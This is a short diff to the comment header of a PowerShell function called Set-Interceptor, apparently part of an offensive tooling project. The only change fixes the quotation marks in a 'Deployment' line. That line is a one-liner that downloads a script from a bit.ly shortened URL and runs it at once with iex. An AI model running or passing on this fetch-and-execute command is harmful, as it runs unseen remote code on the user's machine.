@@ -24,7 +24,7 @@ function Set-Interceptor{
     Optional Dependencies: None
     Version: 1.3.28
     Release Date: 1930 0927014
-    Deployment: iex (New-Object Net.WebClient).DownloadString(“http://bit.ly/1upejwC”)
+    Deployment: iex (New-Object Net.WebClient).DownloadString("http://bit.ly/1upejwC")
 
     .DESCRIPTION
 
